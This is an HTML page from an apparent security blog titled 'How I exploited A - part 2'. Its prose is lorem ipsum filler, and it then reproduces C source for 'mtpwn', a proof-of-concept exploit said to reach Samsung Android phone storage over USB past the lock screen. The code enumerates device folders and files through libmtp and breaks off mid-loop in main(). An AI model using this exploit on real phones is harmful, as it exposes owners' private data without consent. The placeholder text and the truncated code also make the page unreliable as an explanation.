<!DOCTYPE html>
<html lang="en">
  <head>
      <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
    <link rel="icon" href="https://derez.github.io/theme/images/favicon.ico" type="image/x-icon">

    <title>Bits on 0x42697473 - How I exploited A - part 2</title>
    <meta charset="utf-8">
    <link href="https://derez.github.io/feed/all.atom.xml" type="application/atom+xml" rel="alternate" title="Bits on 0x42697473 Full Atom Feed"/>
    <link href="https://derez.github.io/feed/index.xml" type="application/atom+xml" rel="alternate" title="Bits on 0x42697473 Atom Feed"/>
    <link href="https://derez.github.io/category/exploitation/feed/index.xml" type="application/atom+xml" rel="alternate" title="Bits on 0x42697473 Categories Atom Feed"/>
    <link rel="stylesheet" href="https://derez.github.io/theme/vendor/materialize/css/materialize.min.css">
    <link rel="stylesheet" href="https://derez.github.io/theme/vendor/materialize-icons/material-icons.css">
    <link rel="stylesheet" href="https://derez.github.io/theme/vendor/fontawesome/css/font-awesome.css">
    <link rel="stylesheet" href="https://derez.github.io/theme/vendor/fonts/source-code-pro.css">

    <link rel="stylesheet" href="https://derez.github.io/theme/css/current.min.css?3b9cbf50">




    <meta name="tags" contents="python"/>
    <meta name="tags" contents="C"/>
    <meta name="tags" contents="techniques"/>

  </head>
  <body>
    <header>
      <ul id="blog-dropdown" class="dropdown-content">
        <li><a href="https://derez.github.io/categories.html"><i class="fa fa-folder fa-lg"></i>&nbsp;&nbsp;Categories</a></li>
        <li><a href="https://derez.github.io/archives.html"><i class="fa fa-calendar fa-lg"></i>&nbsp;&nbsp;Dates</a></li>
        <li><a href="https://derez.github.io/tags.html"><i class="fa fa-tags fa-lg"></i>&nbsp;&nbsp;Tags</a></li>
      </ul>

      <div class="navbar-fixed">
      <nav role="navigation" class="blue-grey darken-4 cyan-text text-lighten-2">
        <!-- slide-out -->
        <ul id="slide-out" class="side-nav black cyan-text">
          <li>
            <div class="userView">
              <a href="#!user"><img class="circle" src="https://derez.github.io/theme/images/headshot.png"></a>
              <a href="#!name"><span class="name">Danny "derez" Walker</span></a>
              <a href="#!email"><span class="email">derez@packetforge.net</span></a>
            </div>
          </li>
          <li>
              <a href="https://derez.github.io/projects.html" class="cyan-text btn-flat waves-effect waves-orange"><i class="cyan-text fa fa-cog fa-lg"></i>Projects</a>
              <a href="https://derez.github.io/pages/about.html" class="cyan-text btn-flat waves-effect waves-orange"><i class="cyan-text fa fa-user-circle fa-lg"></i>About</a>
          </li>
          <li>
              <b>Browse blog by</b>
              <a href="https://derez.github.io/categories.html" class="cyan-text btn-flat waves-effect waves-orange"><i class="cyan-text fa fa-folder fa-lg"></i>&nbsp;&nbsp;Categories</a>
              <a href="https://derez.github.io/archives.html" class="cyan-text btn-flat waves-effect waves-orange"><i class="cyan-text fa fa-calendar fa-lg "></i>&nbsp;&nbsp;Dates</a>
              <a href="https://derez.github.io/tags.html" class="cyan-text btn-flat waves-effect waves-orange"><i class="cyan-text fa fa-tag fa-lg "></i>&nbsp;&nbsp;Tags</a>
          </li>
        </ul>
        <!-- end of slide-out -->

        <div class="nav-wrapper container">
          <ul id="top-nav" class="top-nav">
            <li>
              <a href="#" data-activates="slide-out" class="button-collapse">
              <i class="orange-text text-darken-4 material-icons">menu</i>
              </a>
            </li>
            <li><a id="logo-container" href="https://derez.github.io/" class="brand-logo">
              <img class="circle" src="https://derez.github.io/theme/images/avatar.png">Bits on 0x42697473</a></li>
            <ul class="right hide-on-med-and-down">
              <li><a class="waves-effect waves-orange btn-flat vertical-align-middle" href="https://derez.github.io/projects.html">
                Projects</a>
              </li>
              <li><a class="dropdown-button waves-effect waves-orange btn-flat vertical-align-middle" data-beloworigin="true" data-constrainwidth="false" href="#" data-activates="blog-dropdown">Blog</a></li>
              <li>
                <form action="https://derez.github.io/search.html">
                  <div class="input-field">
                    <input id="search" type="search" name="q" required autocomplete="off" placeholder="Search...">
                    <label for="search"><i class=" vertical-align-middle orange-text text-darken-4 fa fa-search fa-lg"></i></label>
                  </div>
                </form>
              </li>
            </ul>
          </ul>
        </div>
      </nav>
      </div>
      <div class="hide-on-small-only">
            <nav id="breadcrumbs">
    <div class="nav-wrapper container valign-wrapper">
      <div class="col s12 truncate">
        <a href="/" class="breadcrumb"><i class="fa fa-home"></i></a>
        <a href="/archives.html" class="breadcrumb">Archives</a>
        <a href="/2017/device-exploitation-2.html" class="breadcrumb">How I exploited A - part 2</a>
      </div>
    </div>
  </nav>
      </div>

        <div class="parallax-container ">
    <div class="parallax"><img src="/theme/images/wide.png"></div>
  </div>
    </header>

    <main>
      <div class="container">
        <div class="parallax-offset">


  <article itemscope itemtype="http://schema.org/Article" class="card-panel glow black cyan-text z-depth-5">
    <h1 itemprop="name"><a href="https://derez.github.io/2017/device-exploitation-2.html" rel="bookmark" class="article-name card-title" 
      title="Permalink How I exploited A - part 2">How I exploited A - part&nbsp;2</a></h1>
    <div class="divider"></div>

    <footer class="post-info">
      <span class="published" title="2017-04-26T00:00:00-04:00">
        <i class="vertical-align-middle cyan-text fa fa-calendar fa-lg"></i>&nbsp;&nbsp;Published: 
        <time datetime="2017-04-26" itemprop="dateCreated"> 26 Apr 2017</time>
      </span>
      <br/>
      <address class="vcard author">
        <a class="cyan-text" href="https://derez.github.io/pages/about.html"><i class="cyan-text vertical-align-middle fa fa-user-circle fa-lg"></i>&nbsp;
        Danny Walker</a>
      </address>
    </footer>

    <div class="flow-text section no-padding" itemprop="text">
      <p>Lorem ipsum dolor sit amet, eos ei assum postea. Erant iracundia similique pri ut, ius mutat sanctus et, movet feugiat persecuti pro ex. Essent blandit fastidii nec eu. Sonet vocibus ne usu, vel fabellas salutandi ei, est prima dicit no. Amet mucius albucius eos at.
..&nbsp;PELICAN_END_SUMMARY</p>
<p>Munere quaerendum vim at, eam ne percipit omittantur. Nisl vero veri quo id, summo civibus signiferumque per ut. Vix tollit discere corpora an. Decore cetero mel an. Tantas epicuri nec et, fugit iudicabit percipitur mel in, libris meliore repudiandae nam&nbsp;at.</p>
<p>Eu veri ferri evertitur mea, usu aperiam legimus volumus ex. Nec nisl putant inimicus an. Adhuc iudicabit nec an. Eu odio tollit feugait est, nec ut elitr&nbsp;interpretaris.</p>
<p>No agam delicata usu, oportere adolescens omittantur ut vis, fastidii persequeris voluptatibus eos ea. Id per esse dictas petentium, in choro nullam impetus cum. Eam omnis democritum assueverit an, zril corpora usu ne. Has cu accusam imperdiet urbanitas, novum virtute intellegat per id, aeque quando disputationi ea his. Facilisi consulatu expetendis mei ut. Ex fastidii instructior nam, ad falli minim&nbsp;cum.</p>
<p>His labitur sententiae eu, ad vix neglegentur necessitatibus. His graeco molestie et, dico ipsum vim in, clita mentitum pertinax in nec. Gubergren neglegentur cum no. At esse invidunt qui, nam eu erat natum elaboraret, intellegat vituperata pro ad. Usu et congue volutpat persecuti, mel id utinam lucilius philosophia. Pro veniam debitis ancillae et, vel noluisse persecuti eu. Accusamus gubergren pertinacia est cu, choro discere deleniti cu cum, ne alii ignota labore&nbsp;sed.</p>
<p>Minim possit pri te, te eos wisi minimum, per dicant consequat ut. At discere nominavi est. Nostrum gubergren at est, sed no iudicabit definitiones. Sed eius aliquid an, ea vocibus docendi vix, ullamcorper definitionem in&nbsp;his.</p>
<p>Iriure aperiri adolescens an eum, an vis elit facilis. Vix in brute autem debet, nibh movet voluptatum ex vis, iusto senserit reprimique ex nec. Usu an lorem delenit dissentiunt, vis vero accusam ne. Brute mollis adipisci cum an, esse ullum cotidieque eos te. Duis blandit necessitatibus ex per, ei congue corrumpit efficiendi&nbsp;qui.</p>
<p>Ea diceret vivendum contentiones vim. Timeam necessitatibus at est. Omittantur concludaturque ut mea, cu vis debet voluptaria comprehensam, eu liberavisse instructior mea. Cu convenire honestatis definitionem mei, his no perfecto iracundia. Aeque doming eos ne, et sea utinam tritani corrumpit. Vix magna intellegebat ei, brute consectetuer conclusionemque pri&nbsp;ea.</p>
<p>Mel sint recusabo iracundia an. Partem quaestio in sed, no est oblique constituam instructior. No mei prima assum graecis, iuvaret vocibus vivendum at mel. Malis dicam pro ut. Mei eu facete percipit&nbsp;efficiendi.</p>
<p>At est reque ubique, ea diam falli sed, ei mel purto volutpat. Movet alterum ocurreret usu ne, an verear nominavi theophrastus pro. Ex omnes sensibus concludaturque his, possit cotidieque ei cum, in cum utinam iisque. Ne sea periculis explicari, sit ea vero facer dissentiunt. Ea eam vidit ignota&nbsp;electram.</p>
<pre class="code c literal-block">
<span class="cm">/*
 *  mtpwn - PoC exploit for a vulnerability of Samsung's Android
 *          phones that allows an attacker to access phone storages
 *          via USB, bypassing lock screen and/or &quot;Charge only&quot; mode.
 *          It requires libmtp.
 *
 *  Copyright (C) 2017  Salvatore Mesoraca &lt;s.mesoraca16&#64;gmail.com&gt;
 *
 *  This program is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program.  If not, see &lt;http://www.gnu.org/licenses/&gt;.
 */</span>

<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;time.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;libmtp.h&gt;</span><span class="cp">
</span>
<span class="cp">#define MAX_PATH 1024
</span>
<span class="k">static</span> <span class="kt">void</span> <span class="nf">walk</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">fname</span><span class="p">,</span>
                 <span class="n">LIBMTP_file_t</span> <span class="o">*</span><span class="n">files</span><span class="p">,</span>
                 <span class="n">LIBMTP_folder_t</span> <span class="o">*</span><span class="n">folders</span><span class="p">,</span>
                 <span class="kt">char</span> <span class="o">**</span><span class="n">flist</span><span class="p">,</span>
                 <span class="kt">size_t</span> <span class="n">nmem</span><span class="p">,</span>
                 <span class="kt">ssize_t</span> <span class="o">*</span><span class="n">idx</span><span class="p">,</span>
                 <span class="kt">ssize_t</span> <span class="n">pidx</span><span class="p">)</span>
<span class="p">{</span>
        <span class="kt">size_t</span> <span class="n">cidx</span> <span class="o">=</span> <span class="o">*</span><span class="n">idx</span><span class="p">;</span>
        <span class="kt">size_t</span> <span class="n">fidx</span><span class="p">;</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">folders</span> <span class="o">==</span> <span class="nb">NULL</span> <span class="o">||</span> <span class="n">cidx</span><span class="o">+</span><span class="mi">1</span> <span class="o">&gt;=</span> <span class="n">nmem</span><span class="p">)</span>
                <span class="k">return</span><span class="p">;</span>
        <span class="n">cidx</span> <span class="o">=</span> <span class="o">++</span><span class="p">(</span><span class="o">*</span><span class="n">idx</span><span class="p">);</span>
        <span class="n">flist</span><span class="p">[</span><span class="n">cidx</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="o">*</span><span class="n">MAX_PATH</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">pidx</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
                <span class="n">snprintf</span><span class="p">(</span><span class="n">flist</span><span class="p">[</span><span class="n">cidx</span><span class="p">],</span>
                         <span class="n">MAX_PATH</span><span class="p">,</span>
                         <span class="s">&quot;%s/%x/%s/&quot;</span><span class="p">,</span>
                         <span class="n">fname</span><span class="p">,</span>
                         <span class="n">folders</span><span class="o">-&gt;</span><span class="n">storage_id</span><span class="p">,</span>
                         <span class="n">folders</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">);</span>
        <span class="k">else</span>
                <span class="n">snprintf</span><span class="p">(</span><span class="n">flist</span><span class="p">[</span><span class="n">cidx</span><span class="p">],</span>
                         <span class="n">MAX_PATH</span><span class="p">,</span>
                         <span class="s">&quot;%s%s/&quot;</span><span class="p">,</span>
                         <span class="n">flist</span><span class="p">[</span><span class="n">pidx</span><span class="p">],</span>
                         <span class="n">folders</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">);</span>

        <span class="n">walk</span><span class="p">(</span><span class="n">fname</span><span class="p">,</span> <span class="n">files</span><span class="p">,</span> <span class="n">folders</span><span class="o">-&gt;</span><span class="n">child</span><span class="p">,</span> <span class="n">flist</span><span class="p">,</span> <span class="n">nmem</span><span class="p">,</span> <span class="n">idx</span><span class="p">,</span> <span class="n">cidx</span><span class="p">);</span>
        <span class="n">walk</span><span class="p">(</span><span class="n">fname</span><span class="p">,</span> <span class="n">files</span><span class="p">,</span> <span class="n">folders</span><span class="o">-&gt;</span><span class="n">sibling</span><span class="p">,</span> <span class="n">flist</span><span class="p">,</span> <span class="n">nmem</span><span class="p">,</span> <span class="n">idx</span><span class="p">,</span> <span class="n">pidx</span><span class="p">);</span>

        <span class="k">while</span> <span class="p">(</span><span class="n">files</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">files</span><span class="o">-&gt;</span><span class="n">parent_id</span> <span class="o">==</span> <span class="n">folders</span><span class="o">-&gt;</span><span class="n">folder_id</span> <span class="o">&amp;&amp;</span>
                    <span class="n">folders</span><span class="o">-&gt;</span><span class="n">storage_id</span> <span class="o">==</span> <span class="n">files</span><span class="o">-&gt;</span><span class="n">storage_id</span><span class="p">)</span> <span class="p">{</span>
                        <span class="n">fidx</span> <span class="o">=</span> <span class="o">++</span><span class="p">(</span><span class="o">*</span><span class="n">idx</span><span class="p">);</span>
                        <span class="k">if</span> <span class="p">(</span><span class="n">fidx</span> <span class="o">&gt;=</span> <span class="n">nmem</span><span class="p">)</span>
                                <span class="k">return</span><span class="p">;</span>
                        <span class="n">flist</span><span class="p">[</span><span class="n">fidx</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="o">*</span><span class="n">MAX_PATH</span><span class="p">);</span>
                        <span class="n">snprintf</span><span class="p">(</span><span class="n">flist</span><span class="p">[</span><span class="n">fidx</span><span class="p">],</span>
                                 <span class="n">MAX_PATH</span><span class="p">,</span>
                                 <span class="s">&quot;%s%s&quot;</span><span class="p">,</span>
                                 <span class="n">flist</span><span class="p">[</span><span class="n">cidx</span><span class="p">],</span>
                                 <span class="n">files</span><span class="o">-&gt;</span><span class="n">filename</span><span class="p">);</span>
                <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">cidx</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">files</span><span class="o">-&gt;</span><span class="n">parent_id</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
                        <span class="n">fidx</span> <span class="o">=</span> <span class="o">++</span><span class="p">(</span><span class="o">*</span><span class="n">idx</span><span class="p">);</span>
                        <span class="k">if</span> <span class="p">(</span><span class="n">fidx</span> <span class="o">&gt;=</span> <span class="n">nmem</span><span class="p">)</span>
                                <span class="k">return</span><span class="p">;</span>
                        <span class="n">flist</span><span class="p">[</span><span class="n">fidx</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="o">*</span><span class="n">MAX_PATH</span><span class="p">);</span>
                        <span class="n">snprintf</span><span class="p">(</span><span class="n">flist</span><span class="p">[</span><span class="n">fidx</span><span class="p">],</span>
                                 <span class="n">MAX_PATH</span><span class="p">,</span>
                                 <span class="s">&quot;%s/%x/%s&quot;</span><span class="p">,</span>
                                 <span class="n">fname</span><span class="p">,</span>
                                 <span class="n">files</span><span class="o">-&gt;</span><span class="n">storage_id</span><span class="p">,</span>
                                 <span class="n">files</span><span class="o">-&gt;</span><span class="n">filename</span><span class="p">);</span>
                <span class="p">}</span>
                <span class="n">files</span> <span class="o">=</span> <span class="n">files</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
        <span class="p">}</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">size_t</span> <span class="nf">folders_count</span><span class="p">(</span><span class="n">LIBMTP_folder_t</span> <span class="o">*</span><span class="n">folders</span><span class="p">)</span>
<span class="p">{</span>
        <span class="kt">size_t</span> <span class="n">c</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">folders</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
                <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
        <span class="n">c</span> <span class="o">+=</span> <span class="n">folders_count</span><span class="p">(</span><span class="n">folders</span><span class="o">-&gt;</span><span class="n">child</span><span class="p">);</span>
        <span class="n">c</span> <span class="o">+=</span> <span class="n">folders_count</span><span class="p">(</span><span class="n">folders</span><span class="o">-&gt;</span><span class="n">sibling</span><span class="p">);</span>
        <span class="k">return</span> <span class="n">c</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">size_t</span> <span class="nf">files_count</span><span class="p">(</span><span class="n">LIBMTP_file_t</span> <span class="o">*</span><span class="n">files</span><span class="p">)</span>
<span class="p">{</span>
        <span class="kt">size_t</span> <span class="n">c</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

        <span class="k">while</span> <span class="p">(</span><span class="n">files</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">files</span> <span class="o">=</span> <span class="n">files</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
                <span class="o">++</span><span class="n">c</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="n">c</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">static</span> <span class="kt">size_t</span> <span class="nf">approx_count</span><span class="p">(</span><span class="n">LIBMTP_file_t</span> <span class="o">*</span><span class="n">files</span><span class="p">,</span> <span class="n">LIBMTP_folder_t</span> <span class="o">*</span><span class="n">folders</span><span class="p">)</span>
<span class="p">{</span>
        <span class="kt">size_t</span> <span class="n">c</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

        <span class="n">c</span> <span class="o">+=</span> <span class="n">files_count</span><span class="p">(</span><span class="n">files</span><span class="p">);</span>
        <span class="n">c</span> <span class="o">+=</span> <span class="n">folders_count</span><span class="p">(</span><span class="n">folders</span><span class="p">);</span>
        <span class="k">return</span> <span class="n">c</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">int</span> <span class="nf">pathcmp</span><span class="p">(</span><span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">b</span><span class="p">)</span>
<span class="p">{</span>
        <span class="k">return</span> <span class="n">strcmp</span><span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="kt">char</span> <span class="o">**</span><span class="p">)</span><span class="n">a</span><span class="p">),</span> <span class="o">*</span><span class="p">((</span><span class="kt">char</span> <span class="o">**</span><span class="p">)</span><span class="n">b</span><span class="p">));</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">destroy</span><span class="p">(</span><span class="kt">char</span> <span class="o">**</span><span class="n">fname</span><span class="p">,</span>
                    <span class="n">LIBMTP_file_t</span> <span class="o">**</span><span class="n">files</span><span class="p">,</span>
                    <span class="n">LIBMTP_folder_t</span> <span class="o">**</span><span class="n">folders</span><span class="p">,</span>
                    <span class="kt">char</span> <span class="o">***</span><span class="n">flist</span><span class="p">,</span>
                    <span class="kt">size_t</span> <span class="n">nmem</span><span class="p">)</span>
<span class="p">{</span>
        <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
        <span class="n">LIBMTP_file_t</span> <span class="o">*</span><span class="n">fs</span> <span class="o">=</span> <span class="o">*</span><span class="n">files</span><span class="p">,</span> <span class="o">*</span><span class="n">tmp</span><span class="p">;</span>
        <span class="kt">char</span> <span class="o">**</span><span class="n">fl</span> <span class="o">=</span> <span class="o">*</span><span class="n">flist</span><span class="p">;</span>

        <span class="n">free</span><span class="p">(</span><span class="o">*</span><span class="n">fname</span><span class="p">);</span>
        <span class="o">*</span><span class="n">fname</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

        <span class="k">while</span> <span class="p">(</span><span class="n">fs</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">tmp</span> <span class="o">=</span> <span class="n">fs</span><span class="p">;</span>
                <span class="n">fs</span> <span class="o">=</span> <span class="n">fs</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
                <span class="n">LIBMTP_destroy_file_t</span><span class="p">(</span><span class="n">tmp</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="o">*</span><span class="n">files</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

        <span class="n">LIBMTP_destroy_folder_t</span><span class="p">(</span><span class="o">*</span><span class="n">folders</span><span class="p">);</span>
        <span class="o">*</span><span class="n">folders</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

        <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">nmem</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
                <span class="n">free</span><span class="p">(</span><span class="n">fl</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">nmem</span><span class="p">)</span>
                <span class="n">free</span><span class="p">(</span><span class="n">fl</span><span class="p">);</span>
        <span class="o">*</span><span class="n">flist</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
        <span class="kt">char</span> <span class="o">*</span><span class="n">fname</span><span class="p">;</span>
        <span class="kt">ssize_t</span> <span class="n">idx</span><span class="p">;</span>
        <span class="kt">size_t</span> <span class="n">fcount</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">reals</span><span class="p">,</span> <span class="n">i</span><span class="p">;</span>
        <span class="kt">char</span> <span class="o">**</span><span class="n">flist</span><span class="p">;</span>
        <span class="n">LIBMTP_mtpdevice_t</span> <span class="o">*</span><span class="n">device_list</span><span class="p">,</span> <span class="o">*</span><span class="n">device</span><span class="p">;</span>
        <span class="n">LIBMTP_file_t</span> <span class="o">*</span><span class="n">files</span><span class="p">,</span> <span class="o">*</span><span class="n">f2</span><span class="p">;</span>
        <span class="n">LIBMTP_folder_t</span> <span class="o">*</span><span class="n">folders</span><span class="p">;</span>
        <span class="n">LIBMTP_file_t</span> <span class="o">*</span><span class="n">newfile</span><span class="p">;</span>

        <span class="n">srand</span><span class="p">(</span><span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span>
        <span class="n">LIBMTP_Init</span><span class="p">();</span>

        <span class="k">switch</span> <span class="p">(</span><span class="n">LIBMTP_Get_Connected_Devices</span><span class="p">(</span><span class="o">&amp;</span><span class="n">device_list</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">case</span> <span class="nl">LIBMTP_ERROR_NONE</span><span class="p">:</span>
                <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="nl">LIBMTP_ERROR_NO_DEVICE_ATTACHED</span><span class="p">:</span>
                <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;%s: no devices found</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
                <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
        <span class="k">case</span> <span class="nl">LIBMTP_ERROR_CONNECTING</span><span class="p">:</span>
                <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span>
                        <span class="s">&quot;%s: There has been an error connecting</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span>
                        <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
                <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
        <span class="k">case</span> <span class="nl">LIBMTP_ERROR_MEMORY_ALLOCATION</span><span class="p">:</span>
                <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;%s: Memory Allocation Error</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
                <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
        <span class="k">case</span> <span class="nl">LIBMTP_ERROR_GENERAL</span><span class="p">:</span>
        <span class="k">default</span><span class="o">:</span>
                <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;%s: Unknown error</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
                <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n\n</span><span class="s">Files list:</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
        <span class="k">for</span> <span class="p">(</span><span class="n">device</span> <span class="o">=</span> <span class="n">device_list</span><span class="p">;</span> <span class="n">device</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">;</span> <span class="n">device</span> <span class="o">=</span> <span class="n">device</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">fname</span> <span class="o">=</span> <span class="n">LIBMTP_Get_Friendlyname</span><span class="p">(</span><span class="n">device</span><span class="p">);</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">fname</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
                        <span class="n">fname</span> <span class="o">=</span> <span class="n">strdup</span><span class="p">(</span><span class="s">&quot;NONAME&quot;</span><span class="p">);</span>
                <span class="n">folders</span> <span class="o">=</span> <span class="n">LIBMTP_Get_Folder_List</span><span class="p">(</span><span class="n">device</span><span class="p">);</span>
                <span class="n">files</span> <span class="o">=</span> <span class="n">LIBMTP_Get_Filelisting_With_Callback</span><span class="p">(</span><span class="n">device</span><span class="p">,</span>
                                                             <span class="nb">NULL</span><span class="p">,</span>
                                                             <span class="nb">NULL</span><span class="p">);</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">folders</span> <span class="o">==</span> <span class="nb">NULL</span> <span class="o">&amp;&amp;</span> <span class="n">files</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
                        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Nothing to see here.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
                        <span class="n">LIBMTP_Dump_Errorstack</span><span class="p">(</span><span class="n">device</span><span class="p">);</span>
                        <span class="n">LIBMTP_Clear_Errorstack</span><span class="p">(</span><span class="n">device</span><span class="p">);</span>
                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                        <span class="n">fcount</span> <span class="o">=</span> <span class="n">approx_count</span><span class="p">(</span><span class="n">files</span><span class="p">,</span> <span class="n">folders</span><span class="p">);</span>
                        <span class="n">flist</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="n">fcount</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">));</span>
                        <span class="n">idx</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
                        <span class="n">walk</span><span class="p">(</span><span class="n">fname</span><span class="p">,</span> <span class="n">files</span><span class="p">,</span> <span class="n">folders</span><span class="p">,</span> <span class="n">flist</span><span class="p">,</span> <span class="n">fcount</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">idx</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
                        <span class="n">reals</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
                        <span class="k">while</span> <span class="p">(</span><span class="n">reals</span> <span class="o">&lt;</span> <span class="n">fcount</span><span class="p">)</span>
                                <span class="k">if</span> <span class="p">(</span><span class="n">flist</span><span class="p">[</span><span class="n">reals</span><span class="p">])</span>
                                        <span class="o">++</span><span class="n">reals</span><span class="p">;</span>
                                <span class="k">else</span>
                                        <span class="k">break</span><span class="p">;</span>
                        <span class="n">qsort</span><span class="p">(</span><span class="n">flist</span><span class="p">,</span> <span class="n">reals</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">),</span> <span class="n">pathcmp</span><span class="p">);</span>
                        <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">reals</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
